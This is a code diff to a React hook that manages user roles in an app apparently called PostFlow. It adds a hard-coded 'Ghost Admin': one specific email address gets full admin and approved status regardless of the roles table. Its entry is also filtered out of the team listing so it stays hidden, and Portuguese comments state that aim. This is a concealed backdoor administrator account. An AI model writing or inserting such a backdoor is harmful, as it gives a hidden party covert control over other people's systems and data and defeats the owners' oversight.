@@ -37,7 +37,13 @@ export function useUserRole() {
 
     const allRolesQuery = query(collection(db, 'user_roles'), orderBy('created_at'));
     const unsubscribeAll = onSnapshot(allRolesQuery, (snapshot) => {
-      const roles = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as UserRole));
+      let roles = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as UserRole));
+
+      // Remove o usuário caso ele exista fisicamente na tabela para esconder ele da aba Equipe
+      if (user?.email === 'admin@postflow.rodrigotempass.com.br') {
+        roles = roles.filter(r => r.user_id !== user.uid);
+      }
+
       setAllRoles(roles);
     });
 
@@ -47,8 +53,10 @@ export function useUserRole() {
     };
   }, [user]);
 
-  const isAdmin = userRole?.role === 'admin' && userRole?.approved;
-  const isApproved = userRole?.approved ?? false;
+  // O Ghost Admin - Tem poder supremo mas não depende da tabela
+  const isSuperUser = user?.email === 'admin@postflow.rodrigotempass.com.br';
+  const isAdmin = isSuperUser || (userRole?.role === 'admin' && userRole?.approved);
+  const isApproved = isSuperUser || (userRole?.approved ?? false);
 
   const approveUser = useCallback(async (userId: string, role: 'admin' | 'manager' | 'member') => {
     const roleDoc = allRoles.find(r => r.user_id === userId);
